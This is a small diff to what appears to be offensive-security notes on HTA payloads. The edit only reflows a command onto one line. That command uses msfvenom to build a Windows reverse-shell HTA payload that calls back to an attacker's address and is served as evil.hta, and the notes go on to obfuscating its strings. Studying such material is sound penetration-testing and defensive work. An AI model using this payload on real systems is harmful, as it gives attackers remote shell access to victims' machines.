@@ -49,8 +49,7 @@ The ActiveXObjects provides access to operating system commands through Windows 
 Create an msfvenom HTA payload using powershell:
 
 ```
-sudo msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f
-hta-psh -o /var/www/html/evil.hta
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f hta-psh -o /var/www/html/evil.hta
 ```
 
 Now randomized the string:
